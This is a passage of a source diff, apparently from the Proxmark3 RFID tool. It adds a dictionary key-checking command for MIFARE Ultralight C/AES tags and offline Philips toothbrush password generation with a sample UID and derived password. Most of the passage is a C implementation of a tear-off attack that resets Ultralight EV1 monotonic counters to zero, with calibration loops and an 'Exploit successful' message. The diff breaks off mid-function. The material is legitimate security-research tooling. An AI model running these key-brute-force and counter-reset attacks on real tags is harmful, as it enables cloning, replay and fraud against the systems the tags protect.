-            // all keys,  aborted
-            if (res == PM3_SUCCESS || res == 2) {
+            int res = mfu_3pass_check_keys(key_index, firstChunk, lastChunk, nkeys, segment, ref_key, xor_ref_key, keyBlock + (i * keysize), false, true, &auths, &ms, check_answer, use_fastread0);
+            firstChunk = false;
+
+            // all keys
+            if (res == PM3_SUCCESS) {
                 PrintAndLogEx(NORMAL, "");
                 goto out;
             }
-            PrintAndLogEx(INPLACE, "Testing %5i/%5i ( " _YELLOW_("%02.1f %%") " )", i, keycnt, (float)i * 100 / keycnt);
+
+            // aborted or no answer,  the field is still ON if not on last chunk
+            if ((res == PM3_EOPABORTED) || (res == PM3_ETIMEOUT)) {
+                clearCommandBuffer();
+                SendCommandNG(CMD_FPGA_MAJOR_MODE_OFF, NULL, 0);
+                if (res == PM3_ETIMEOUT) {
+                    ret = res;
+                }
+                PrintAndLogEx(NORMAL, "");
+                goto out;
+            }
+            PrintAndLogEx(INPLACE, "Testing %5u/%5u ( " _YELLOW_("%02.1f %%") " )", i + nkeys, keycnt, (float)(i + nkeys) * 100 / keycnt);
         } // end chunks of keys
     }
     PrintAndLogEx(NORMAL, "");
 out:
     PrintAndLogEx(INFO, "Time spent " _YELLOW_("%.1fs"), (float)(ms / 1000.0));
     PrintAndLogEx(INFO, "Authentication attempts: %u", auths);
-    PrintAndLogEx(INFO, "Speed: %.1f auths/s", (float)(auths * 1000.0 / ms));
+    // ms is 0 until a chunk answers
+    if (ms) {
+        PrintAndLogEx(INFO, "Speed: %.1f auths/s", (float)(auths * 1000.0 / ms));
+    }
 
     free(keyBlock);
     PrintAndLogEx(NORMAL, "");
-    return PM3_SUCCESS;
+    return ret;
+}
+
+static int CmdHF14AMfUAuthChk(const char *Cmd) {
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "hf mfu chk",
+                  "Checks MIFARE Ultralight C / Ultralight AES tag keys against a dictionary file.\n"
+                  "The tag type is read off the card and picks the key slot to attack.\n"
+                  "  UL-C ..... single 3DES key, --idx does not apply\n"
+                  "  UL-AES ... key index 0 DataProtKey (default)\n"
+                  "             key index 1 UIDRetrKey\n"
+                  "             key index 2 OriginalityKey\n"
+                  "Without -f, " _YELLOW_(MFU_DEFAULT_KEY_DIC) " is used for both tag types.\n"
+                  "A segment check (-s) holds 4 byte keys, so it needs its own dictionary via -f.",
+                  "hf mfu chk\n"
+                  "hf mfu chk -f mfulc_default_keys.dic\n"
+                  "hf mfu chk -f mfulaes_hw1.dic --idx 1\n"
+                  "hf mfu chk -f mfulc_segment_hw1.dic -s 0");
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_str0("f", "file", "<fn>", "filename of dictionary"),
+        arg_int0("i", "idx", "<0..2>", "Key index, Ultralight AES only (def: 0)"),
+        arg_int0("s", "segment", "<0..3>", "Segment index (full key if not specified)"),
+        arg_int0("r", "retries", "<0..255>", "Number of retries (def: 0)"),
+        arg_str0("k", "key", "<hex>", "Starting key, 16 hex bytes (def: zero key), for segment check"),
+        arg_lit0("x", "xor", "XOR starting key with segment candidates (def: override)"),
+        arg_lit0("n", "nocheck", "Skip checking tag answer correctness"),
+        arg_lit0("0", "read0", "Use fast READ0 (skip anticol)"),
+        arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, true);
+
+    int fnlen = 0;
+    char filename[FILE_PATH_SIZE] = {0};
+    CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
+    int key_idx = arg_get_int_def(ctx, 2, -1);   // -1 means not given
+    int segment = arg_get_int_def(ctx, 3, -1);   // -1 means full key
+    int retries = arg_get_int_def(ctx, 4, 0);
+    int ref_keylen = 0;
+    uint8_t ref_key[16] = {0};
+    CLIGetHexWithReturn(ctx, 5, ref_key, &ref_keylen);
+    bool xor_ref_key = arg_get_lit(ctx, 6);
+    bool check_answer = !arg_get_lit(ctx, 7);
+    bool use_fastread0 = arg_get_lit(ctx, 8);
+    CLIParserFree(ctx);
+
+    if (key_idx < -1 || key_idx > 2) {
+        PrintAndLogEx(ERR, "Invalid key index (must be 0..2)");
+        return PM3_EINVARG;
+    }
+    if (segment < -1 || segment > 3) {
+        PrintAndLogEx(ERR, "Invalid segment (must be 0..3)");
+        return PM3_EINVARG;
+    }
+    if (retries < 0 || retries > 255) {
+        PrintAndLogEx(ERR, "Invalid retries (must be 0..255)");
+        return PM3_EINVARG;
+    }
+    if (ref_keylen && ref_keylen != MIFAREU3P_KEY_SIZE) {
+        PrintAndLogEx(WARNING, "Key must be %i hex bytes. Got %d", MIFAREU3P_KEY_SIZE, ref_keylen);
+        return PM3_EINVARG;
+    }
+
+    if (fnlen == 0) {
+        if (segment != -1) {
+            PrintAndLogEx(ERR, "A segment check needs a segment dictionary, pass one with " _YELLOW_("-f"));
+            PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("mfulc_segment_hw1.dic") "` or `" _YELLOW_("mfulaes_segment_hw1.dic") "`");
+            return PM3_EFILE;
+        }
+        fnlen = snprintf(filename, sizeof(filename), MFU_DEFAULT_KEY_DIC);
+        PrintAndLogEx(INFO, "No dictionary given, using " _YELLOW_("%s"), filename);
+    }
+
+    uint64_t tagtype = GetHF14AMfU_Type();
+    if (tagtype == MFU_TT_UL_ERROR) {
+        PrintAndLogEx(WARNING, "No Ultralight tag found");
+        return PM3_ESOFT;
+    }
+    ul_print_type(tagtype, 0);
+
+    uint8_t key_index;
+    if ((tagtype & MFU_TT_UL_AES) == MFU_TT_UL_AES) {
+        key_index = (key_idx == -1) ? 0 : (uint8_t)key_idx;
+    } else if ((tagtype & MFU_TT_UL_C) == MFU_TT_UL_C) {
+        if (key_idx != -1) {
+            PrintAndLogEx(ERR, "Ultralight C holds a single key, " _YELLOW_("--idx") " is for Ultralight AES");
+            return PM3_EINVARG;
+        }
+        key_index = MIFAREULC_KEY_INDEX;
+    } else {
+        PrintAndLogEx(ERR, "Tag is neither Ultralight C nor Ultralight AES");
+        PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu info") "` to see what this tag is");
+        return PM3_EINVARG;
+    }
+
+    return mfu_auth_chk(key_index, filename, fnlen, segment, retries, ref_key, xor_ref_key, check_answer, use_fastread0);
 }
 //-------------------------------------------------------------------------------
 // Ultralight AES Methods
@@ -4928,134 +5243,6 @@ static int CmdHF14AMfUAESAuth(const char *Cmd) {
 
 
 
-static int CmdHF14AMfUAESAuthChk(const char *Cmd) {
-    CLIParserContext *ctx;
-    CLIParserInit(&ctx, "hf mfu aeschk",
-                  "It checks MIFARE Ultralight AES tags keys against a dictionary file with keys\n"
-                  "  Key index 0... DataProtKey (default)\n"
-                  "  Key index 1... UIDRetrKey\n"
-                  "  Key index 2... OriginalityKey\n",
-                  "hf mfu aeschk -f mfulaes_default_keys.dic");
-
-    void *argtable[] = {
-        arg_param_begin,
-        arg_str0("f", "file", "<fn>", "filename of dictionary"),
-        arg_int0("i", "idx", "<0..2>", "Key index (def: 0)"),
-        arg_int0("s", "segment", "<0..3>", "Segment index (full key if not specified)"),
-        arg_int0("r", "retries", "<0..255>", "Number of retries (def: 0)"),
-        arg_str0("k", "key", "<hex>", "Starting key, 16 hex bytes (def: zero key), for segment check"),
-        arg_lit0("x", "xor", "XOR starting key with segment candidates (def: override)"),
-        arg_lit0("n", "nocheck", "Skip checking tag answer correctness"),
-        arg_lit0("0", "read0", "Use fast READ0 (skip anticol)"),
-        arg_param_end
-    };
-    CLIExecWithReturn(ctx, Cmd, argtable, true);
-
-    int fnlen = 0;
-    char filename[FILE_PATH_SIZE] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
-    int key_index = arg_get_int_def(ctx, 2, 0);
-    int segment = arg_get_int_def(ctx, 3, -1);   // -1 means full key
-    int retries = arg_get_int_def(ctx, 4, 0);
-    int ref_keylen = 0;
-    uint8_t ref_key[16] = {0};
-    CLIGetHexWithReturn(ctx, 5, ref_key, &ref_keylen);
-    bool xor_ref_key = arg_get_lit(ctx, 6);
-    bool check_answer = !arg_get_lit(ctx, 7);
-    bool use_fastread0 = arg_get_lit(ctx, 8);
-    CLIParserFree(ctx);
-
-    if (fnlen == 0) {
-        PrintAndLogEx(ERR, "No dictionary file specified");
-        return PM3_EFILE;
-    }
-    if (key_index < 0 || key_index > 2) {
-        PrintAndLogEx(ERR, "Invalid key index (must be 0..2)");
-        return PM3_EINVARG;
-    }
-    if (segment < -1 || segment > 3) {
-        PrintAndLogEx(ERR, "Invalid segment (must be 0..3)");
-        return PM3_EINVARG;
-    }
-    if (retries < 0 || retries > 255) {
-        PrintAndLogEx(ERR, "Invalid retries (must be 0..255)");
-        return PM3_EINVARG;
-    }
-    if (ref_keylen && ref_keylen != MIFAREU3P_KEY_SIZE) {
-        PrintAndLogEx(WARNING, "Key must be %i hex bytes. Got %d", MIFAREU3P_KEY_SIZE, ref_keylen);
-        return PM3_EINVARG;
-    }
-    if (ref_keylen == 0) {
-        ref_keylen = MIFAREU3P_KEY_SIZE;
-    }
-
-    uint8_t *keyBlock = NULL;
-    uint32_t keycnt = 0;
-    int keysize = segment != -1 ? MIFAREU3P_KEY_SIZE / 4 : MIFAREU3P_KEY_SIZE;
-    int ret = mfu_3pass_load_keys(&keyBlock, &keycnt, filename, fnlen, keysize);
-    if (ret != PM3_SUCCESS) {
-        return ret;
-    }
-    if (keycnt == 0) {
-        PrintAndLogEx(ERR, "Dictionary contains no keys");
-        free(keyBlock);
-        return PM3_ESOFT;
-    }
-
-    // cap by what fits in one frame, then by what the nkeys field can announce
-    uint32_t max_chunk = (g_conn.max_cmd_data_size - MIFAREU3P_CHKKEY_HEADER) / keysize;
-    if (max_chunk > MIFAREU3P_CHKKEY_MAX_KEYS) {
-        max_chunk = MIFAREU3P_CHKKEY_MAX_KEYS;
-    }
-    uint32_t chunksize = (keycnt > max_chunk) ? max_chunk : keycnt;
-    bool firstChunk = true, lastChunk = false;
-
-    int i = 0;
-
-    uint32_t auths = 0;
-    uint32_t ms = 0;
-
-    // main keychunk loop
-    for (int r = 0; r < retries + 1; r++) {
-        for (i = 0; i < keycnt; i += chunksize) {
-            if (kbd_enter_pressed()) {
-                clearCommandBuffer();
-                SendCommandNG(CMD_BREAK_LOOP, NULL, 0);
-                SendCommandNG(CMD_FPGA_MAJOR_MODE_OFF, NULL, 0);   // field is still ON if not on last chunk
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(WARNING, "\naborted via keyboard!");
-                goto out;
-            }
-
-            uint32_t nkeys = ((keycnt - i)  > chunksize) ? chunksize : keycnt - i;
-
-            // last chunk?
-            if (nkeys == keycnt - i) {
-                lastChunk = true;
-            }
-
-            int res = mfu_3pass_check_keys(key_index, firstChunk, lastChunk, nkeys, segment, ref_key, xor_ref_key, keyBlock + (i * keysize), false, true, &auths, &ms, check_answer, use_fastread0);
-            if (firstChunk)
-                firstChunk = false;
-
-            // all keys,  aborted
-            if (res == PM3_SUCCESS || res == 2) {
-                PrintAndLogEx(NORMAL, "");
-                goto out;
-            }
-            PrintAndLogEx(INPLACE, "Testing %5i/%5i ( " _YELLOW_("%02.1f %%") " )", i, keycnt, (float)i * 100 / keycnt);
-        } // end chunks of keys
-    }
-    PrintAndLogEx(NORMAL, "");
-out:
-    PrintAndLogEx(INFO, "Time spent " _YELLOW_("%.1fs"), (float)(ms / 1000.0));
-    PrintAndLogEx(INFO, "Authentication attempts: %u", auths);
-    PrintAndLogEx(INFO, "Speed: %.1f auths/s", (float)(auths * 1000.0 / ms));
-
-    free(keyBlock);
-    PrintAndLogEx(NORMAL, "");
-    return PM3_SUCCESS;
-}
 
 static int CmdHF14AMfUAESGetUID(const char *Cmd) {
     CLIParserContext *ctx;
@@ -6264,16 +6451,18 @@ static int CmdHF14AMfUKeyGen(const char *Cmd) {
 static int CmdHF14AMfUPwdGen(const char *Cmd) {
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf mfu pwdgen",
-                  "Generate different passwords from known pwdgen algos",
-                  "hf mfu pwdgen -r\n"
-                  "hf mfu pwdgen --uid 11223344556677\n"
+                  "Generate different passwords from known pwdgen algos.\n"
+                  "Reads UID and Philips MFG string from the tag, or works offline with `--uid`.",
+                  "hf mfu pwdgen                          -> read from tag\n"
+                  "hf mfu pwdgen --uid 11223344556677     -> offline\n"
+                  "hf mfu pwdgen --uid 040D4B5AC57181 --mfg 3231303632382035324D  -> offline, Philips pwd FBCFACC1\n"
                   "hf mfu pwdgen --test"
                  );
 
     void *argtable[] = {
         arg_param_begin,
-        arg_str0("u", "uid", "<hex>", "UID (7 hex bytes)"),
-        arg_lit0("r", NULL, "Read UID from tag"),
+        arg_str0("u", "uid", "<hex>", "UID (7 hex bytes), offline"),
+        arg_str0(NULL, "mfg", "<hex>", "Philips toothbrush MFG string, pages 21-23 bytes 2..11 (10 hex bytes)"),
         arg_lit0(NULL, "test", "self test"),
         arg_param_end
     };
@@ -6282,7 +6471,9 @@ static int CmdHF14AMfUPwdGen(const char *Cmd) {
     int u_len = 0;
     uint8_t uid[7] = {0x00};
     CLIGetHexWithReturn(ctx, 1, uid, &u_len);
-    bool use_tag = arg_get_lit(ctx, 2);
+    int mfg_len = 0;
+    uint8_t philips_mfg[10] = {0};
+    CLIGetHexWithReturn(ctx, 2, philips_mfg, &mfg_len);
     bool selftest = arg_get_lit(ctx, 3);
     CLIParserFree(ctx);
 
@@ -6290,9 +6481,23 @@ static int CmdHF14AMfUPwdGen(const char *Cmd) {
         return generator_selftest();
     }
 
-    uint8_t philips_mfg[10] = {0};
+    if (mfg_len && mfg_len != sizeof(philips_mfg)) {
+        PrintAndLogEx(WARNING, "MFG must be 10 hex bytes");
+        return PM3_EINVARG;
+    }
 
-    if (use_tag) {
+    if (mfg_len && u_len == 0) {
+        PrintAndLogEx(WARNING, "`--mfg` needs `--uid`");
+        return PM3_EINVARG;
+    }
+
+    if (u_len == 0) {
+
+        if (g_session.pm3_present == false) {
+            PrintAndLogEx(WARNING, "Offline, use `--uid`");
+            return PM3_ENOTTY;
+        }
+
         // read uid from tag
         int res = ul_read_uid(uid);
         if (res == PM3_ELENGTH) {
@@ -6645,564 +6850,670 @@ static int CmdHF14AMfuOtpTearoff(const char *Cmd) {
 }
 
 
+//
+// Tear-off attack against the MFU EV1 monotonic counters.
+// Port of the pyscript `client/pyscripts/mfuev1_counter_reset.py`,
+// based on Quarkslab research "RFID Monotonic Counter Anti-Tearing Defeated"
+//
+#define MFU_CNT_MAX             0xFFFFFF
+#define MFU_CNT_PREPARE_TARGET  0x00FFFF
+#define MFU_CNT_STUCK_VALUE     6       // counter may be read as 6 after a failed tear
+#define MFU_CNT_DELAY_BD_MIN    2700
+#define MFU_CNT_DELAY_BD_MAX    5000
+#define MFU_CNT_DELAY_BD_STEP   5
+#define MFU_CNT_DELAY_00_OFFSET 10      // delay_00 = delay_bd - this offset
+#define MFU_CNT_DELAY_TUNE_STEP 1
+#define MFU_CNT_DELAY_TUNE_JUMP 10
+#define MFU_CNT_RETRIES         3
+#define MFU_CNT_RETRY_SLEEP_MS  200
+#define MFU_CNT_REPAIR_ATTEMPTS 5
+#define MFU_CNT_REPAIR_DELAY    2950
 
-static int counter_reset_tear(iso14a_card_select_t *card, uint8_t cnt_no) {
+// attack phases
+#define MFU_CNT_PHASE_DECREMENT 0
+#define MFU_CNT_PHASE_PREPARE   1
+#define MFU_CNT_PHASE_RESET     2
 
-    PrintAndLogEx(INFO, "Reset tear check");
+static const uint8_t mfu_cnt_incr_zero[3] = {0x00, 0x00, 0x00};
+static const uint8_t mfu_cnt_incr_up1[3]  = {0x01, 0x00, 0x00};  // LE 0x000001
+static const uint8_t mfu_cnt_incr_dec1[3] = {0x00, 0x01, 0x00};  // LE 0x000100
 
-    uint8_t cw[6] = { MIFARE_ULEV1_INCR_CNT, cnt_no, 0x00, 0x00, 0x00, 0x00};
-    uint8_t ct[1] = {0};
-    uint8_t resp[10] = {0};
+static void mfu_cnt_hex(int value, char *buf) {
+    snprintf(buf, 7, "%02X%02X%02X"
+             , (uint8_t)(value & 0xFF)
+             , (uint8_t)((value >> 8) & 0xFF)
+             , (uint8_t)((value >> 16) & 0xFF)
+            );
+}
 
-    if (ul_select(card) == false) {
-        PrintAndLogEx(FAILED, "failed to select card, exiting...");
+// script prints the tearing byte as-is; "?" when it was not a valid answer
+static void mfu_cnt_tearfmt(uint8_t tear, char *buf, size_t len) {
+    if (tear == 0x00 || tear == 0xBD) {
+        snprintf(buf, len, "%02X", tear);
+    } else {
+        snprintf(buf, len, "?");
+    }
+}
+
+static int mfu_cnt_read(uint8_t counter, int *value) {
+    for (int i = 0; i < MFU_CNT_RETRIES; i++) {
+        iso14a_card_select_t card;
+        if (ul_select(&card) == false) {
+            msleep(MFU_CNT_RETRY_SLEEP_MS);
+            continue;
+        }
+
+        uint8_t resp[3] = {0x00};
+        int len = ulev1_readCounter(counter, resp, sizeof(resp), false);
+        DropField();
+        if (len == sizeof(resp)) {
+            if (value) {
+                *value = (resp[0] | resp[1] << 8 | resp[2] << 16);
+            }
+            return PM3_SUCCESS;
+        }
+        msleep(MFU_CNT_RETRY_SLEEP_MS);
+    }
+    return PM3_ESOFT;
+}
+
+// CHECK_TEARING_EVENT only ever answers 0x00 (no tear) or 0xBD (tear detected)
+static int mfu_cnt_check_tearing(uint8_t counter, uint8_t *tearing) {
+    for (int i = 0; i < MFU_CNT_RETRIES; i++) {
+        iso14a_card_select_t card;
+        if (ul_select(&card) == false) {
+            msleep(MFU_CNT_RETRY_SLEEP_MS);
+            continue;
+        }
+
+        uint8_t resp[1] = {0x00};
+        int len = ulev1_readTearing(counter, resp, sizeof(resp));
+        DropField();
+        if (len == sizeof(resp) && (resp[0] == 0x00 || resp[0] == 0xBD)) {
+            *tearing = resp[0];
+            return PM3_SUCCESS;
+        }
+        msleep(MFU_CNT_RETRY_SLEEP_MS);
+    }
+    // no valid answer, script placeholder "?"
+    *tearing = 0xFF;
+    return PM3_ESOFT;
+}
+
+// INCREASE_CNT layout: A5, counter, value[3] little endian, 0x00, CRC appended
+static int mfu_cnt_incr(uint8_t counter, const uint8_t value[3]) {
+    iso14a_card_select_t card;
+    if (ul_select(&card) == false) {
         return PM3_ESOFT;
     }
-    if (ul_send_cmd_raw(cw, sizeof(cw), resp, sizeof(resp), false) < 0) {
-        PrintAndLogEx(FAILED, "failed to write all ZEROS");
-        return PM3_ESOFT;
-    }
-    if (ulev1_readTearing(cnt_no, ct, sizeof(ct)) < 0) {
-        PrintAndLogEx(FAILED, "AFTER, failed to read ANTITEAR,  exiting...");
-        return PM3_ESOFT;
-    }
+
+    uint8_t cmd[6] = {MIFARE_ULEV1_INCR_CNT, counter, 0x00, 0x00, 0x00, 0x00};
+    memcpy(cmd + 2, value, 3);
+    uint8_t resp[4] = {0x00};
+    int len = ul_send_cmd_raw(cmd, sizeof(cmd), resp, sizeof(resp), false);
     DropField();
+    return (len >= 0) ? PM3_SUCCESS : PM3_ESOFT;
+}
 
-    if (ct[0] != 0xBD) {
-        PrintAndLogEx(INFO, "Resetting seem to have failed, WHY!?");
+// arm the generic tear-off hook for the very next raw command
+static int mfu_cnt_tear_on(int delay_us) {
+    if (delay_us < 1 || delay_us > 0xFFFF) {
+        return PM3_EINVARG;
+    }
+    tearoff_params_t params = {
+        .delay_us = delay_us,
+        .skip = 0,
+        .on = true,
+        .off = false,
+    };
+    return handle_tearoff(&params, false);
+}
+
+static void mfu_cnt_tear_off(void) {
+    tearoff_params_t params = {
+        .delay_us = 0,
+        .skip = 0,
+        .on = false,
+        .off = true,
+    };
+    handle_tearoff(&params, false);
+}
+
+// consolidate the antitear/tear condition into a stable state
+static void mfu_cnt_normalize_tear(uint8_t counter) {
+    uint8_t tear = 0;
+    for (int i = 0; i < (MFU_CNT_REPAIR_ATTEMPTS * 2); i++) {
+        if (mfu_cnt_check_tearing(counter, &tear) == PM3_SUCCESS) {
+            return;
+        }
+        mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+    }
+}
+
+// repair a stuck antitear/tear condition
+static bool mfu_cnt_repair_tear(uint8_t counter) {
+    uint8_t tear = 0;
+    iso14a_card_select_t card;
+    ul_select(&card);   // wake card
+
+    for (int i = 0; i < MFU_CNT_REPAIR_ATTEMPTS; i++) {
+        if (mfu_cnt_check_tearing(counter, &tear) == PM3_SUCCESS) {
+            return true;
+        }
+        mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+        mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+        msleep(MFU_CNT_RETRY_SLEEP_MS);
+    }
+
+    PrintAndLogEx(WARNING, "Attempting tear-off repair...");
+    mfu_cnt_tear_on(MFU_CNT_REPAIR_DELAY);
+    mfu_cnt_incr(counter, mfu_cnt_incr_up1);
+    msleep(MFU_CNT_RETRY_SLEEP_MS);
+    ul_select(&card);   // wake card
+    return (mfu_cnt_check_tearing(counter, &tear) == PM3_SUCCESS);
+}
+
+static void mfu_cnt_decrement_step(uint8_t counter, int delay_bd, int delay_00) {
+    mfu_cnt_tear_on(delay_bd);
+    mfu_cnt_incr(counter, mfu_cnt_incr_dec1);
+    mfu_cnt_tear_on(delay_00);
+    mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+    mfu_cnt_tear_on(delay_bd);
+    mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+    mfu_cnt_tear_on(delay_00);
+    mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+    mfu_cnt_normalize_tear(counter);
+}
+
+static void mfu_cnt_reset_step(uint8_t counter, int delay_bd, int delay_00) {
+    mfu_cnt_tear_on(delay_bd);
+    mfu_cnt_incr(counter, mfu_cnt_incr_up1);
+    mfu_cnt_tear_on(delay_00);
+    mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+    mfu_cnt_normalize_tear(counter);
+}
+
+// tune BD delay based on counter changes, locked delay is kept as is
+static int mfu_cnt_tune_delay(int delay_bd, int previous, int current, bool locked) {
+    if (locked) {
+        return delay_bd;
+    }
+    if (current == previous) {
+        int up = delay_bd + MFU_CNT_DELAY_TUNE_STEP;
+        return (up > MFU_CNT_DELAY_BD_MAX) ? MFU_CNT_DELAY_BD_MAX : up;
+    }
+    if (current - previous > MFU_CNT_DELAY_TUNE_JUMP) {
+        int down = delay_bd - MFU_CNT_DELAY_TUNE_STEP;
+        return (down < MFU_CNT_DELAY_BD_MIN) ? MFU_CNT_DELAY_BD_MIN : down;
+    }
+    return delay_bd;
+}
+
+static bool mfu_cnt_is_ev1(void) {
+    iso14a_card_select_t card;
+    if (ul_select(&card) == false) {
+        return false;
+    }
+
+    // GET_VERSION layout: [1]=vendor, [2]=product type, [3]=subtype,
+    // [4]=major version. MIFARE Ultralight EV1 -> product type 0x03,
+    // major version 0x01. NTAG also reports major 0x01, so the product
+    // type must be checked too.
+    uint8_t version[8] = {0x00};
+    int len = ulev1_getVersion(version, sizeof(version), false);
+    DropField();
+    if (len >= 5 && version[2] == 0x03 && version[4] == 0x01) {
+        return true;
+    }
+
+    // fallback to the full tag type detection, "hf mfu info" equivalent
+    uint64_t tagtype = GetHF14AMfU_Type();
+    return (tagtype & (MFU_TT_UL_EV1 | MFU_TT_UL_EV1_48 | MFU_TT_UL_EV1_128 | MFU_TT_UL_NANO_40)) != 0;
+}
+
+static int mfu_cnt_preflight(uint8_t counter, int *counter_val, uint8_t *tearing) {
+    iso14a_card_select_t card;
+    ul_select(&card);   // wake card
+
+    if (mfu_cnt_is_ev1() == false) {
+        PrintAndLogEx(FAILED, "Support only Mifare UL EV1 cards");
         return PM3_ESOFT;
     }
+
+    if (mfu_cnt_repair_tear(counter) == false) {
+        uint8_t tear = 0;
+        mfu_cnt_check_tearing(counter, &tear);
+        char tstr[4];
+        mfu_cnt_tearfmt(tear, tstr, sizeof(tstr));
+        PrintAndLogEx(FAILED, "Could not repair tear flag (got 0x%s)", tstr);
+        return PM3_ESOFT;
+    }
+
+    if (mfu_cnt_check_tearing(counter, tearing) != PM3_SUCCESS) {
+        PrintAndLogEx(FAILED, "Card does not support CHECK_TEARING_EVENT");
+        return PM3_ESOFT;
+    }
+
+    int val = 0;
+    if (mfu_cnt_read(counter, &val) != PM3_SUCCESS) {
+        PrintAndLogEx(FAILED, "Cannot read initial counter");
+        return PM3_ESOFT;
+    }
+    if (val == MFU_CNT_MAX) {
+        PrintAndLogEx(FAILED, "Counter is at maximum (0x%06X), cannot reset", MFU_CNT_MAX);
+        return PM3_ESOFT;
+    }
+    if (val == 0) {
+        PrintAndLogEx(FAILED, "Counter is already at minimum (0)");
+        return PM3_ESOFT;
+    }
+
+    char hexstr[7];
+    mfu_cnt_hex(val, hexstr);
+    char tstr[4];
+    mfu_cnt_tearfmt(*tearing, tstr, sizeof(tstr));
+    PrintAndLogEx(INFO, "Counter " _YELLOW_("%u") ": " _YELLOW_("%d") " (0x" _YELLOW_("%s") ") | Tear: 0x%s"
+                  , counter
+                  , val
+                  , hexstr
+                  , tstr
+                 );
+
+    *counter_val = val;
     return PM3_SUCCESS;
 }
 
+static int mfu_cnt_calibrate(uint8_t counter, int *delay_bd_out, int *delay_00_out) {
+    int best_bd = -1;
 
+    for (int delay_bd = MFU_CNT_DELAY_BD_MIN; delay_bd < MFU_CNT_DELAY_BD_MAX; delay_bd += MFU_CNT_DELAY_BD_STEP) {
+        if (kbd_enter_pressed()) {
+            // script: return (best_bd, None) -> caller interrupts or fails silently
+            *delay_bd_out = best_bd;
+            return PM3_EOPABORTED;
+        }
+
+        int initial = 0;
+        if (mfu_cnt_read(counter, &initial) != PM3_SUCCESS) {
+            mfu_cnt_repair_tear(counter);
+            continue;
+        }
+
+        mfu_cnt_tear_on(delay_bd);
+        mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+
+        uint8_t tear = 0;
+        mfu_cnt_check_tearing(counter, &tear);   // 0x00 / 0xBD / 0xFF placeholder
+        bool check_tearing = (tear == 0xBD);     // script: tearing == "BD"
+
+        mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+        mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+
+        int final_val = 0;
+        if (mfu_cnt_read(counter, &final_val) != PM3_SUCCESS) {
+            mfu_cnt_repair_tear(counter);
+            continue;
+        }
+
+        char ihex[7], fhex[7];
+        mfu_cnt_hex(initial, ihex);
+        mfu_cnt_hex(final_val, fhex);
+        char tearstr[16];
+        if (check_tearing) {
+            snprintf(tearstr, sizeof(tearstr), _GREEN_("BD"));
+        } else if (tear == 0x00) {
+            snprintf(tearstr, sizeof(tearstr), _RED_("00"));
+        } else {
+            snprintf(tearstr, sizeof(tearstr), _RED_("?"));
+        }
+        PrintAndLogEx(NORMAL, "\r[=] Testing delay: " _YELLOW_("%d") " us | Check tearing: %s | Counter: " _YELLOW_("%s") " -> " _YELLOW_("%s") NOLF
+                      , delay_bd
+                      , tearstr
+                      , ihex
+                      , fhex
+                     );
+
+        if (check_tearing) {
+            best_bd = delay_bd;
+            if (final_val == initial) {   // stable
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(SUCCESS, "Working BD delay: " _GREEN_("%d") " us", delay_bd);
+                *delay_bd_out = delay_bd;
+                int delay_00 = delay_bd - MFU_CNT_DELAY_00_OFFSET;
+                *delay_00_out = (delay_00 < MFU_CNT_DELAY_BD_MIN) ? MFU_CNT_DELAY_BD_MIN : delay_00;
+                return PM3_SUCCESS;
+            }
+        }
+    }
+
+    if (best_bd > -1) {
+        PrintAndLogEx(NORMAL, "");
+        PrintAndLogEx(WARNING, "Counter drift during calibration; using last BD delay: " _GREEN_("%d") " us", best_bd);
+        *delay_bd_out = best_bd;
+        int delay_00 = best_bd - MFU_CNT_DELAY_00_OFFSET;
+        *delay_00_out = (delay_00 < MFU_CNT_DELAY_BD_MIN) ? MFU_CNT_DELAY_BD_MIN : delay_00;
+        return PM3_SUCCESS;
+    }
+
+    PrintAndLogEx(NORMAL, "");
+    PrintAndLogEx(FAILED, "Auto-calibration failed; try manual --DelayBD 2720");
+    return PM3_ESOFT;
+}
+
+static int mfu_cnt_attack_loop(uint8_t counter, int *delay_bd_out, int *delay_00_out) {
+    int delay_bd = *delay_bd_out;
+    int delay_00 = *delay_00_out;
+
+    int phase = MFU_CNT_PHASE_DECREMENT;
+    uint32_t attempt = 0;
+    uint32_t reset_attempts = 0;
+    bool delay_locked = false;
+
+    int tune_reference = 0;
+    int reset_reference = 0;
+    int counter_val = 0;
+    if (mfu_cnt_read(counter, &counter_val) == PM3_SUCCESS) {
+        tune_reference = counter_val;
+        reset_reference = counter_val;
+    }
+
+    while (kbd_enter_pressed() == false) {
+
+        if (mfu_cnt_read(counter, &counter_val) != PM3_SUCCESS) {
+            mfu_cnt_repair_tear(counter);
+            msleep(MFU_CNT_RETRY_SLEEP_MS);
+            continue;
+        }
+
+        if (counter_val == 0) {
+            PrintAndLogEx(NORMAL, "");
+            PrintAndLogEx(SUCCESS, "Exploit successful");
+            *delay_bd_out = delay_bd;
+            *delay_00_out = delay_00;
+            return PM3_SUCCESS;
+        }
+
+        if (counter_val == MFU_CNT_STUCK_VALUE) {
+            mfu_cnt_repair_tear(counter);
+            continue;
+        }
+
+        if (phase == MFU_CNT_PHASE_DECREMENT) {
+
+            if (counter_val <= MFU_CNT_PREPARE_TARGET) {
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(INFO, "Switching to PREPARE phase (counter <= 0x%06X)", MFU_CNT_PREPARE_TARGET);
+                mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+                msleep(MFU_CNT_RETRY_SLEEP_MS);
+                mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+                phase = MFU_CNT_PHASE_PREPARE;
+                reset_reference = counter_val;
